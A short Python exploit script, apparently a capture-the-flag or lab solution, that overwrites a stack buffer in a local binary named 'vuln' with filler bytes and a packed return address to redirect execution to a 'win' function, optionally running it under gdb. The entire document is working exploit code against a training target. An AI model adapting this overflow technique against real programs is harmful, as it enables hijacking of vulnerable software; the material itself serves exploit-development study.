# Exploit : Redirect program execution to win function
import os
import struct

USE_GDB = True
gdb_data = b"r\n"

win = 0x401460

payload = b"A"*64 # fill buffer
payload += b"B"*12 # padding
payload += struct.pack("I", 0x401460)

if USE_GDB:
    content = gdb_data+payload
else:
    content = payload

file = open("payload", "wb")
file.write(content)
file.close()
if USE_GDB:
    os.system("gdb vuln < payload")
else:
    os.system("vuln < payload")